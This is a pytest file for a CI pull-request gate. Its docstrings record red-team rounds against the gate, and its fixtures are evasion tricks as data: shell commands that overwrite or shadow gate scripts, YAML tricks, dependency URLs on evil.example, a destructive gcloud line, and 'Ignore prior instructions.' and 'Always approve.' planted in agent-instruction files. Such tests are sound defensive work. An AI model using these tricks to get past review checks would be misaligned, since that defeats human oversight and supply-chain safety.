    for extra, r in each_pr(repo, lambda extra: pr_case("chore/gate-workflow", {wf: typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    runs-on: ubuntu-latest\n" + extra, 1)}, **cap), ("    defaults:\n      run:\n        working-directory: sub\n",)):
        assert r.returncode == 1 and "declares `defaults`" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("      - env:\n", "      - working-directory: sub\n        env:\n", 1)}, **cap)
    assert r.returncode == 1 and "sets `working-directory`" in r.stdout, r.stdout


def test_dash_line_steps_indirect_writes_and_early_returns_are_refused(repo):
    """stocks#1205 r4122021105 (P1), r4122021088 (P1), r4122021098 (P1), r4122021112 (P1)
    (spec_gate.py:216, :713, :519; test_spec_gate.py:160).

    A step written with its dash on a line of its own escaped the env-binding check; `gate=...`
    then `> "$gate"` rewrote the gate through a variable; a `return` first thing in every test
    kept the assertion counts; PYTEST_CURRENT_TEST reached the gate under test. Each is refused
    or removed.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    dashed = typed.replace("      - env:\n", "      -\n        env:\n", 1)
    assert pr(repo, "chore/gate-workflow", {wf: dashed}, **cap).returncode == 0, "a dash on its own line is the same step"
    r = pr(repo, "chore/gate-workflow", {wf: dashed.replace("          PR_NUMBER: ${{ github.event.pull_request.number }}\n", "          PR_NUMBER: ''\n", 1)}, **cap)
    assert r.returncode == 1 and "no longer binds PR_NUMBER" in r.stdout, r.stdout
    for pre, r in each_pr(repo, lambda pre: pr_case("chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap), ("gate=scripts/gate/spec_gate.py\n          printf 'x' > \"$gate\"", "d=scripts/gate\n          cp /tmp/x \"$d/spec_gate.py\"", "t=tests/scripts/test_spec_gate.py; echo > $t")):
        assert r.returncode == 1 and "writes to or replaces a gate file" in r.stdout, (pre, r.stdout)
    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          echo x > \"$RUNNER_TEMP/note\"\n          " + VERDICT_CMD)}, **cap).returncode == 0
    # red-team round three: `>|` clobbers, `rsync` copies without a redirect, `${RUNNER_TEMP}/../..` climbs out of
    # the temp directory, an archive extractor or `python3 -m zipfile` replaces a gate file without naming it
    for pre, r in each_pr(repo, lambda pre: pr_case("chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap), ("printf 'x' >| scripts/gate/spec_gate.py", "gate=scripts/gate/spec_gate.py; printf 'x' >| \"$gate\"",
                "printf 'x' >|/usr/local/bin/python3", "rsync \"$RUNNER_TEMP/ng.py\" scripts/gate/spec_gate.py",
                "rsync \"$RUNNER_TEMP/ng.py\" /usr/local/bin/python3", "D=scripts/gate; printf 'x' > \"${RUNNER_TEMP}/../../${D}/spec_gate.py\"",
                "python3 -m pip install --target scripts/gate yaml")):
        assert r.returncode == 1 and ("writes to or replaces a gate file" in r.stdout or "beyond what the gate needs" in r.stdout), (pre, r.stdout)
    for pre, r in each_pr(repo, lambda pre: pr_case("chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap), ("tar -xf \"$RUNNER_TEMP/a.tar\"", "unzip -o \"$RUNNER_TEMP/a.zip\"", "python3 -m zipfile -e \"$RUNNER_TEMP/a.zip\" .", "python3 -m tarfile -e a.tar")):
        assert r.returncode == 1 and "runs inline code" in r.stdout, (pre, r.stdout)
    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          python3 -m pip install --quiet pyyaml\n          " + VERDICT_CMD)}, **cap).returncode == 0
    # red-team round four: a writer anywhere on the line, and `set -n`, which executes nothing after it
    for pre, r in each_pr(repo, lambda pre: pr_case("chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap), ("command cp lib/model.py scripts/gate/spec_gate.py", "env cp lib/model.py scripts/gate/spec_gate.py",
                "timeout 5 cp lib/model.py scripts/gate/spec_gate.py", "find lib -name model.py -exec cp {} scripts/gate/spec_gate.py \\;",
                "printf -v gate '%s' scripts/gate/spec_gate.py; cp lib/model.py \"$gate\"",
                "((1)) && cp lib/model.py scripts/gate/spec_gate.py", "coproc { cp lib/model.py scripts/gate/spec_gate.py; }")):
        assert r.returncode == 1 and "writes to or replaces a gate file" in r.stdout, (pre, r.stdout)
    for pre, r in each_pr(repo, lambda pre: pr_case("chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap), ("{cp,lib/model.py,scripts/gate/spec_gate.py}", "$'cp' lib/model.py scripts/gate/spec_gate.py", "echo lib/model.py scripts/gate/spec_gate.py | xargs cp")):
        assert r.returncode == 1 and ("runs inline code" in r.stdout or "writes to or replaces" in r.stdout or "beyond what the gate needs" in r.stdout), (pre, r.stdout)
    for pre, r in each_pr(repo, lambda pre: pr_case("chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap), ("set -n", "set -o noexec", "set -en", "if true; then set -n; fi")):
        assert r.returncode == 1 and "no longer executes" in r.stdout, (pre, r.stdout)
    suite_text = "def test_a():\n    assert f(1)\n"
    on_base(repo, {"tests/scripts/test_spec_gate.py": suite_text})
    for escape, r in each_pr(repo, lambda escape: pr_case("chore/gate-suite", {"tests/scripts/test_spec_gate.py": escape}, **cap), ("def test_a():\n    return\n    assert f(1)\n", "def test_a():\n    raise SystemExit(0)\n    assert f(1)\n")):
        assert r.returncode == 1 and "no skip markers, collection hooks or exits" in r.stdout, (escape, r.stdout)
    import inspect
    assert '"PYTEST_"' in inspect.getsource(gate)   # the helper strips pytest's own variables from the gate's environment


def test_hook_grammar_supersedes_paths_catalog_shape_and_documentation_edges(repo):
    """Red-team of this PR (spec_gate.py: hook check, check_supersedes, check_policy_structure,
    canvas_modes, is_documentation, git, check_capacity, frontmatter).

    A hook could `git reset -q` before calling the gate; `supersedes: ./docs/...` resolved for git
    but matched no string compare; promoting a record heading swallowed the next record; a board's
    `mode:` was read as the canvas's; `lib/CLAUDE.md` was documentation; a non-ASCII path was
    refused as gated; one `n/a` waived filled labels; a duplicate frontmatter key took the last
    value. Each is refused or corrected.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    on_base(repo, {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 scripts/gate/spec_gate.py --commit\n"})
    for extra, r in each_pr(repo, lambda extra: pr_case("chore/gate-hook", {".githooks/pre-commit": "#!/bin/sh\nset -e\n" + extra + "python3 scripts/gate/spec_gate.py --commit\n"}, **cap), ("git reset -q\n", "python3 docs/tools/prep.py\n", ". docs/hooks/common.sh\n", "cd /tmp\n", "git symbolic-ref HEAD refs/heads/spike/tmp\n")):
        assert r.returncode == 1 and "is not one the hook may carry" in r.stdout, (extra, r.stdout)
    real_hook = REPO.joinpath(".githooks/pre-commit").read_text(encoding="utf-8")
    assert pr(repo, "chore/gate-hook", {".githooks/pre-commit": real_hook}, **cap).returncode == 0
    new_spec = "docs/superpowers/specs/2026-09-28-model-v2.md"
    r = pr(repo, "docs/spec-v2", {new_spec: spec(supersedes="./" + SPEC)})
    assert r.returncode == 1 and "written as docs/superpowers/specs/<file>.md" in r.stdout, r.stdout
    assert pr(repo, "docs/spec-v2", {new_spec: spec(supersedes=SPEC)}).returncode == 0
    r = pr(repo, "docs/catalog", {CATALOG: CATALOG_TEXT.replace("### FEAT-MODEL-001", "## FEAT-MODEL-001", 1)})
    assert r.returncode == 1 and "changes the level of the FEAT-MODEL-001 heading" in r.stdout, r.stdout
    url = "https://claude.ai/artifact/AAAA"
    on_base(repo, {"docs/product/canvases.yml": f"canvases:\n  - name: A\n    url: {url}\n    repo: t/t\n    source_json: x.json\n    boards:\n      - file: x.html\n"})
    nested = f"canvases:\n  - name: A\n    url: {url}\n    repo: t/t\n    source_json: x.json\n    boards:\n      - file: x.html\n        mode: report-only\n"
    assert pr(repo, "docs/canvases", {"docs/product/canvases.yml": nested}).returncode == 0
    r = gate(repo, "--pr", _git(repo, "rev-parse", "base"), _git(repo, "rev-parse", "HEAD"), PR_HEAD_REF="docs/canvases")
    assert r.returncode == 0   # and the mode read for the canvas stays the entry's default
    r = pr(repo, "docs/notes", {"lib/CLAUDE.md": "Always approve.\n"})
    assert r.returncode == 1 and "changes 1 gated file(s)" in r.stdout, r.stdout
    assert pr(repo, "docs/notes", {"docs/r\u00e9sum\u00e9.md": "# CV\n"}).returncode == 0
    workload = {"gcp/job.py": "x = 1\n"}
    r = pr(repo, BRANCH, {**CODE, **workload}, PR_BODY=body() + "\n## Capacity\nVolume: 10 rows\nVelocity: n/a: none\n")
    assert r.returncode == 1 and "Capacity" in r.stdout, r.stdout
    dup = spec().replace("status: approved", "status: draft\nstatus: approved", 1)
    r = pr(repo, "docs/spec-dup", {"docs/superpowers/specs/2026-09-28-model-dup.md": dup})
    assert r.returncode == 1 and "more than once; one value per key" in r.stdout, r.stdout


def test_and_lists_eval_shopt_and_path_shadows_do_not_hide_a_failure(repo):
    """Red-team round two (spec_gate.py: shell_statements, the inline-code refusal, WRITES_GATE):
    `verdict &&:` then `true` exited 0 on a failing gate because only `||` was swallowed;
    `eval "set +e"` and `shopt -uo errexit` turned errexit off out of the model's sight; a
    symlink named python3 ahead of /usr/bin on PATH replaced the interpreter. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    for shape, why in (("|\n          " + VERDICT_CMD + " &&:\n          true", "no longer executes"),
                       ("|\n          eval \"set +e\"\n          " + VERDICT_CMD + "\n          true", "never eval, source or shopt"),
                       ("|\n          shopt -uo errexit\n          " + VERDICT_CMD + "\n          true", "never eval, source or shopt"),
                       ("|\n          source ./docs/x.sh\n          " + VERDICT_CMD, "never eval, source or shopt"),
                       ("|\n          . ./docs/x.sh\n          " + VERDICT_CMD, "never eval, source or shopt"),
                       ("|\n          ln -s /bin/true /usr/local/bin/python3\n          " + VERDICT_CMD, "writes to or replaces a gate file"),
                       ("|\n          printf '#!/bin/sh\\nexit 0' > /usr/local/bin/git\n          " + VERDICT_CMD, "writes to or replaces a gate file"),
                       ("|\n          cp /bin/true \"$HOME/.local/bin/pytest\"\n          " + VERDICT_CMD, "writes to or replaces a gate file")):
        r = pr(repo, "chore/gate-workflow", {wf: gate_workflow(a=shape)}, **cap)
        assert r.returncode == 1 and why in r.stdout, (shape, r.stdout)
    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow()}, **cap).returncode == 0


def test_pr_bodies_manifests_and_ownership_read_as_github_renders_them(repo):
    """Red-team round three (spec_gate.py: checklist, visible, DEFERRAL, matched_boxes, check_close_out,
    non_dependency_edit, is_documentation, DEPLOY_FEAT, check_registry_rows, run).

    A deferral on a lazy-continuation line rendered inside the ticked item and was never scanned;
    U+2028 and zero-width spaces split or hid deferral words; `postponed`, `parked`, `out of scope`
    and the like passed; an unticked child under a ticked parent left the parent done; a ticked
    duplicate line beat an honest unticked one; a fence closed by an indented closer exposed the
    boxes inside it; a CRLF body with a fence lost everything after it; `---`/`n/a`/`TBC` passed as
    a Status; chore/ carried pip options and new requirements files that CI executes; `.github/prompts/`
    was documentation although a workflow feeds it to a model; deploy files belonged to any FEAT;
    a feature PR rewrote another model's registry row. Each is refused or read as rendered.
    """
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    head = f"Spec: {SPEC}\nPlan: {PLAN}\n\n"
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=head + f"- [x] {DONE[0]}\n- [x] {DONE[1]}\nfollow-up: the test is not run yet, non-blocking, tracked in #1300\n")
    assert r.returncode == 1 and "defers its work" in r.stdout, r.stdout
    for hidden, r in each_pr(repo, lambda hidden: pr_case(BRANCH, CODE, **title, PR_BODY=head + f"- [x] {DONE[0]}\n" + hidden), (f"- [x] {DONE[1]} follow-up, non-blocking\n", f"- [x] {DONE[1]} (follow​-up, non-​blocking)\n")):
        assert r.returncode == 1 and "invisible character" in r.stdout, r.stdout
    for phrase, r in each_pr(repo, lambda phrase: pr_case(BRANCH, CODE, **title, PR_BODY=head + f"- [x] {DONE[0]}\n- [x] {DONE[1]} — {phrase}\n"), ("postponed to #1300", "parked until the retrain lands", "out of scope for this PR", "descoped; tracked in #1300",
                   "to follow after merge", "left for phase 2", "not in this PR")):
        assert r.returncode == 1 and "defers its work" in r.stdout, (phrase, r.stdout)
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=head + f"- [x] {DONE[0]}\n- [x] {DONE[1]}\n  - [ ] still to do: run it on 3.12\n", PR_NUMBER="42", PR_DRAFT="false")
    assert r.returncode == 1 and "not ticked" in r.stdout, r.stdout
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=head + f"- [x] {DONE[0]}\n- [x] {DONE[1]}\n- [ ] {DONE[1]} — not actually run\n")
    assert r.returncode == 1 and "more than one checkbox line" in r.stdout, r.stdout
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=head + f"```\n    ```\n- [x] {DONE[0]}\n- [x] {DONE[1]}\n```\n")
    assert r.returncode == 1 and "missing:" in r.stdout, r.stdout
    crlf = (head + f"```\nout\n```\n\n- [x] {DONE[0]}\n- [x] {DONE[1]}\n").replace("\n", "\r\n")
    assert pr(repo, BRANCH, CODE, **title, PR_BODY=crlf).returncode == 0, "a CRLF body with a fence renders the boxes after it"
    meta = {**title, "PR_BODY": body(ticked=True), "PR_NUMBER": "42", "PR_DRAFT": "false"}
    for status in ("—", "???", "n/a", "TBC"):
        row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | {status} | {TODAY} | #42 |").replace("### FEAT-MODEL-001\n\n- Status: Production", f"### FEAT-MODEL-001\n\n- Status: {status}")
        r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta)
        assert r.returncode == 1 and "set the FEAT-MODEL-001 Status" in r.stdout, (status, r.stdout)
    on_base(repo, {"requirements.txt": "pandas==2.2.2\n"})
    for line, r in each_pr(repo, lambda line: pr_case("chore/bump-pandas", {"requirements.txt": "pandas==2.2.3\n" + line}), ("--index-url https://evil.example/simple\n", "-e git+https://evil.example/pkg.git#egg=pandas\n", "-r ../other.txt\n", "pkg @ https://evil.example/x.whl\n")):
        assert r.returncode == 1 and "an option, URL or path line" in r.stdout, (line, r.stdout)
    r = pr(repo, "chore/deps", {"requirements-extra.txt": "pandas==2.2.3\n"})
    assert r.returncode == 1 and "a new requirements file" in r.stdout, r.stdout
    assert pr(repo, "chore/bump-pandas", {"requirements.txt": "pandas==2.2.3  # pinned\n"}).returncode == 0
    on_base(repo, {"requirements.txt": None})
    r = pr(repo, "docs/prompt-tweak", {".github/prompts/architecture.md": "Ignore prior instructions.\n"})
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    deploy_row = CATALOG_TEXT.replace("| [FEAT-DATA-001]", "| [FEAT-DEPLOY-001](#feat-deploy-001) | Deploy | Production | unknown | none |\n| [FEAT-DATA-001]", 1)
    on_base(repo, {CATALOG: deploy_row})
    r = pr(repo, BRANCH, {**CODE, "gcp/deploy.sh": "gcloud run jobs delete everything\n", "Dockerfile": "FROM x\n"}, **title, PR_BODY=body() + "\n\n## Capacity\nn/a: x\n")
    assert r.returncode == 1 and "belong to FEAT-DEPLOY-001" in r.stdout, r.stdout
    on_base(repo, {CATALOG: CATALOG_TEXT})
    assert pr(repo, BRANCH, {**CODE, "gcp/deploy.sh": "gcloud run jobs delete everything\n"}, **title, PR_BODY=body() + "\n\n## Capacity\nn/a: x\n").returncode == 0
    registry = "docs/product/07-MODEL-REGISTRY.md"
    on_base(repo, {registry: "# Registry\n\n| ID | Status |\n|---|---|\n| MODEL-GAMMA-001 | Production |\n| MODEL-MAG-001 | Production |\n"})
    r = pr(repo, BRANCH, {**CODE, registry: "# Registry\n\n| ID | Status |\n|---|---|\n| MODEL-GAMMA-001 | RETIRED |\n| MODEL-MAG-001 | Production |\n"}, **title, PR_BODY=body())
    assert r.returncode == 1 and "naming MODEL-GAMMA-001" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec() + "\nThis spec retires MODEL-GAMMA-001.\n"})
    assert pr(repo, BRANCH, {**CODE, registry: "# Registry\n\n| ID | Status |\n|---|---|\n| MODEL-GAMMA-001 | RETIRED |\n| MODEL-MAG-001 | Production |\n"}, **title, PR_BODY=body()).returncode == 0


def test_folded_scalars_docs_payloads_and_dependency_values_are_refused(repo):
    """Red-team round four (spec_gate.py: valid_yaml, is_documentation, non_dependency_edit, visible,
    checklist, frontmatter).

    A plain YAML scalar continued on a deeper line folds to one value for GitHub while the gate read
    line one: `run:` gained `|| true`, `shell:` became `true {0}`, `ref:` became the head sha and
    PR_DRAFT gained junk; a workflow-level `defaults:` went unread. docs/ carried setup.py, wheels
    and nested `.claude/` skills, and a requirements path line installed them; chore/ pointed a
    dependency at a URL, a git ref or a path; `follow&#8209;up`, `non-<b></b>blocking`, a U+2011 and
    a nested plain bullet hid a deferral; a multi-line done_when item was read as its first line.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    for folded in (typed.replace("        run: " + VERDICT_CMD + "\n", "        run: " + VERDICT_CMD + "\n          || true\n", 1),
                   typed.replace("      - env:\n", "      - shell:\n          true {0}\n        env:\n", 1),
                   typed.replace("          ref: ${{ github.event.pull_request.base.sha }}\n", "          ref:\n            ${{ github.event.pull_request.head.sha }}\n", 1),
                   typed.replace("          PR_DRAFT: ${{ github.event.pull_request.draft }}\n", "          PR_DRAFT: ${{ github.event.pull_request.draft }}\n            x\n", 1)):
        assert folded != typed
        r = pr(repo, "chore/gate-workflow", {wf: folded}, **cap)
        assert r.returncode == 1 and "continues a plain scalar" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("permissions:\n", "defaults:\n  run:\n    working-directory: sub\npermissions:\n", 1)}, **cap)
    assert r.returncode == 1 and "`working-directory` under a top-level `defaults:`" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
    for path, r in each_pr(repo, lambda path: pr_case("docs/payload", {path: "x\n"}), ("docs/pkg/setup.py", "docs/pkg/pyproject.toml", "docs/evil-1.0-py3-none-any.whl", "docs/index.html", "docs/diagram.svg", "docs/tools/run.py",
                 "docs/conftest.py", "lib/.claude/skills/deploy/SKILL.md", "docs/.claude/settings.json", ".github/copilot-instructions.md",
                 ".github/instructions/all.instructions.md", ".github/agents/fixer.md", ".github/PULL_REQUEST_TEMPLATE.md")):
        assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, (path, r.stdout)
    assert pr(repo, "docs/notes", {"docs/notes.md": "# Notes\n", "docs/data.csv": "a,b\n", ".github/workflows/README.md": "# Workflows\n"}).returncode == 0
    on_base(repo, {"requirements.txt": "requests==2.32.2\n"})
    for line, r in each_pr(repo, lambda line: pr_case("chore/bump", {"requirements.txt": "requests==2.32.3\n" + line}), ("docs/pkg\n", "docs/evil-1.0-py3-none-any.whl\n", "docs/pkg[extra] ; python_version >= '3'\n", "evil@file:docs/x.whl\n")):
        assert r.returncode == 1 and "an option, URL or path line" in r.stdout, (line, r.stdout)
    assert pr(repo, "chore/bump", {"requirements.txt": "requests==2.32.3 \\\n    --hash=sha256:" + "ab" * 32 + "\npandas[perf]>=2.2,<3 ; python_version >= '3.10'\n"}).returncode == 0
    on_base(repo, {"requirements.txt": None})
    package = {"name": "x", "version": "1.0.0", "dependencies": {"react": "^19.1.0"}, "overrides": {"react": "^19.1.0"}}
    on_base(repo, {"package.json": json.dumps(package, indent=2) + "\n"})
    for value, r in each_pr(repo, lambda value: pr_case("chore/bump", {"package.json": json.dumps({**package, "dependencies": {"react": value}}, indent=2) + "\n"}), ("git+https://github.com/evil/react.git#main", "https://evil.example/react-19.tgz", "file:docs/pkg", "github:evil/react", "npm:evil-pkg@1.0.0")):
        assert r.returncode == 1 and "not a version range" in r.stdout, (value, r.stdout)
    r = pr(repo, "chore/bump", {"package.json": json.dumps({**package, "overrides": {"react": "https://evil.example/react-19.tgz"}}, indent=2) + "\n"})
    assert r.returncode == 1 and "not a version range" in r.stdout, r.stdout
    assert pr(repo, "chore/bump", {"package.json": json.dumps({**package, "dependencies": {"react": ">=19.1.0 <20"}}, indent=2) + "\n"}).returncode == 0
    on_base(repo, {"package.json": None})
    pyproject = '[project]\nname = "x"\nversion = "1.0.0"\ndependencies = ["pandas==2.2.0"]\n\n[tool.uv.sources]\npandas = { index = "pypi" }\n'
    on_base(repo, {"pyproject.toml": pyproject})
    r = pr(repo, "chore/bump", {"pyproject.toml": pyproject.replace('"pandas==2.2.0"', '"pandas @ https://evil.example/pandas.whl"')})
    assert r.returncode == 1 and "a URL, path or git reference" in r.stdout, r.stdout
    r = pr(repo, "chore/bump", {"pyproject.toml": pyproject.replace('pandas = { index = "pypi" }', 'pandas = { git = "https://evil.example/pandas" }')})
    assert r.returncode == 1 and "a chore/ branch pins versions and nothing else" in r.stdout, r.stdout
    assert pr(repo, "chore/bump", {"pyproject.toml": pyproject.replace("2.2.0", "2.2.3")}).returncode == 0
    on_base(repo, {"pyproject.toml": None})
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    head = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [x] {DONE[0]}\n"
    for suffix, r in each_pr(repo, lambda suffix: pr_case(BRANCH, CODE, **title, PR_BODY=head + f"- [x] {DONE[1]}{suffix}\n"), (" — non‑blocking, see #1300", " — follow&#8209;up in #1300", " — fol&#108;ow-up in #1300", " — non-<b></b>blocking", "\n  - non-blocking: the registry test is a follow-up")):
        assert r.returncode == 1 and "defers its work" in r.stdout, (suffix, r.stdout)
    on_base(repo, {SPEC: spec(done_when=[DONE[0], "the registry test passes\n    and the canvas is refreshed"])})
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=head + f"- [x] {DONE[1]}\n")
    assert r.returncode == 1 and "missing:" in r.stdout, r.stdout
    assert pr(repo, BRANCH, CODE, **title, PR_BODY=head + f"- [x] {DONE[1]} and the canvas is refreshed\n").returncode == 0
    on_base(repo, {SPEC: spec()})


def test_gate_workflows_and_hook_are_pinned_and_hidden_steps_are_scanned(repo):
    """Red-team round five (spec_gate.py: PINNED, every_run_text, valid_yaml, GATE_PATHS, the git rule).

    A step under `if: ${{ always() }}` or `shell: sh`, a `run :` key, a `run: |2` block and a
    single-quoted value running on to the next line each executed on the runner while the write
    and inline-code scans never read them; `git read-tree` and `git checkout-index` rebuilt the head
    over the base without naming a path; `scripts//gate` and `scripts/./gate` are `scripts/gate` to
    bash. Each is refused. And structurally: the two workflows and the hook are pinned byte for byte
    to copies under scripts/gate/pinned/ read from the base, so a change to one must equal the copy
    already reviewed, in a PR of its own.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    fetch = "      - run: git fetch --no-tags origin \"$HEAD_SHA\"\n"
    for step, r in each_pr(repo, lambda step: pr_case("chore/gate-workflow", {wf: typed.replace(fetch, fetch + step, 1)}, **cap), ("      - if: ${{ always() }}\n        run: git show \"$HEAD_SHA:x.py\" > scripts/gate/spec_gate.py\n",
                 "      - if: true\n        run: python3 -c \"import os\"\n",
                 "      - shell: sh\n        run: git show \"$HEAD_SHA:x.py\" > scripts/gate/spec_gate.py\n",
                 "      - run: |2\n          cp x scripts/gate/spec_gate.py\n",
                 "      - run: git read-tree \"$HEAD_SHA\"\n", "      - run: git checkout-index -f -a\n",
                 "      - run: git switch --discard-changes --detach \"$HEAD_SHA\"\n", "      - run: git merge --no-edit -X theirs \"$HEAD_SHA\"\n",
                 "      - run: git show \"$HEAD_SHA:x.py\" > scripts//gate/spec_gate.py\n", "      - run: git show \"$HEAD_SHA:x.py\" > scripts/./gate/spec_gate.py\n")):
        assert r.returncode == 1 and ("writes to or replaces a gate file" in r.stdout or "runs inline code" in r.stdout), (step, r.stdout)
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace(fetch, "      - run : git show \"$HEAD_SHA:x.py\" > scripts/gate/spec_gate.py\n" + fetch, 1)}, **cap)
    assert r.returncode == 1 and "whitespace before a key's colon" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace(fetch, "      - run: 'true\n          ; git show \"$HEAD_SHA:x.py\" > scripts/gate/spec_gate.py'\n" + fetch, 1)}, **cap)
    assert r.returncode == 1 and "quoted value it does not close" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
    # the pin: with copies on the base, the file must equal its copy
    pin = "scripts/gate/pinned/spec-gate.yml"
    on_base(repo, {pin: typed})
    edited = typed.replace("name: spec-gate\n", "name: spec-gate\n# reviewed change\n", 1)
    r = pr(repo, "chore/gate-workflow", {wf: edited}, **cap)
    assert r.returncode == 1 and "differs from its pinned copy" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {wf: edited, pin: edited}, **cap)
    assert r.returncode == 1 and "differs from its pinned copy" in r.stdout, "changing both in one PR is measured against the base's copy"
    assert pr(repo, "chore/gate-workflow", {pin: edited}, **cap).returncode == 0, "step one: the copy alone"
    r = pr(repo, "chore/gate-workflow", {pin: None}, **cap)
    assert r.returncode == 1 and "cannot be removed" in r.stdout, r.stdout
    on_base(repo, {pin: edited})
    assert pr(repo, "chore/gate-workflow", {wf: edited}, **cap).returncode == 0, "step two: the file equals the reviewed copy"
    on_base(repo, {pin: None})


def test_links_are_not_files_and_deferrals_survive_markup(repo):
    """Red-team round five (spec_gate.py: check, plan_stays_bound, visible, checklist, fold_text, frontmatter,
    is_documentation, GATE_ENTRYPOINTS, DEFERRAL).

    chore/ replaced requirements.txt with a symlink to a file docs/ may edit; a gitlink passed under docs/;
    a plan re-pointed itself at a weaker approved spec; a deferral hid inside a fence whose info string
    holds a backtick, a `<!--` in a code span, `<!-->`, a loose list item after a blank line, a link or
    emphasis split, a word joiner or a Cyrillic letter; `follow-ups`, `defer`, `backlog` passed; a
    Cyrillic Т made `ТBD` a Status; GEMINI.md and .kiro/ passed as documentation; the exporter could be
    deleted silently.
    """
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    on_base(repo, {"requirements.txt": "requests==2.32.2\n", "CHANGELOG.md": "# Changelog\n"})
    _git(repo, "checkout", "-q", "-B", "chore/bump-requests", "base")
    (repo / "requirements.txt").unlink()
    os.symlink("CHANGELOG.md", repo / "requirements.txt")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "link")
    r = gate(repo, "--pr", _git(repo, "rev-parse", "base"), _git(repo, "rev-parse", "HEAD"), PR_HEAD_REF="chore/bump-requests")
    assert r.returncode == 1 and "is a symlink" in r.stdout, r.stdout
    _git(repo, "checkout", "-q", "-B", "docs/vendor", "base")
    _git(repo, "update-index", "--add", "--cacheinfo", "160000," + _git(repo, "rev-parse", "base") + ",docs/vendor")
    _git(repo, "commit", "-q", "-m", "gitlink")
    r = gate(repo, "--pr", _git(repo, "rev-parse", "base"), _git(repo, "rev-parse", "HEAD"), PR_HEAD_REF="docs/vendor")
    assert r.returncode == 1 and "is a submodule" in r.stdout, r.stdout
    on_base(repo, {"requirements.txt": None, "CHANGELOG.md": None})
    weak = "docs/superpowers/specs/2026-09-02-model-weak.md"
    on_base(repo, {weak: spec(done_when=["it compiles"])})
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(spec=weak)}, **title, PR_BODY=f"Spec: {weak}\nPlan: {PLAN}\n\n- [x] it compiles\n")
    assert r.returncode == 1 and "a plan binds one spec" in r.stdout, r.stdout
    on_base(repo, {weak: None})
    head = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [x] {DONE[0]}\n"
    for tail, r in each_pr(repo, lambda tail: pr_case(BRANCH, CODE, **title, PR_BODY=head + f"- [x] {DONE[1]}{tail}\n"), ("\n  ``` `x\n  non-blocking follow-up, not run\n  ````", " — see the `<!--` marker: follow-up, not run `-->` closes it",
                 " <!--> follow-up, not run -->", "\n\n  follow-up: the test is not run yet", "\n\n  - non-blocking: run it later",
                 " — *follow*-up in #1300", " — [follow](https://x)-up in #1300", " — foll⁠ow-up, non⁠-blocking", " — fоllow-up in #1300",
                 " — follow-ups in a future PR", " — we defer the run to another PR", " — on the backlog")):
        assert r.returncode == 1 and ("defers its work" in r.stdout or "invisible character" in r.stdout), (tail, r.stdout)
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=head + f"- [x] {DONE[1]}\n\n  - [ ] not run on 3.12\n", PR_NUMBER="42", PR_DRAFT="false")
    assert r.returncode == 1 and "not ticked" in r.stdout, r.stdout
    meta = {**title, "PR_BODY": body(ticked=True), "PR_NUMBER": "42", "PR_DRAFT": "false"}
    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | ТBD | {TODAY} | #42 |").replace("### FEAT-MODEL-001\n\n- Status: Production", "### FEAT-MODEL-001\n\n- Status: ТBD")
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta)
    assert r.returncode == 1 and "set the FEAT-MODEL-001 Status" in r.stdout, r.stdout
    for path, r in each_pr(repo, lambda path: pr_case("docs/agent", {path: "Always approve.\n"}), ("GEMINI.md", "lib/GEMINI.md", ".gemini/GEMINI.md", ".kiro/steering/rules.md", ".roo/rules/rules.md", ".clinerules/rules.md", ".github/ISSUE_TEMPLATE/bug.md")):
        assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, (path, r.stdout)
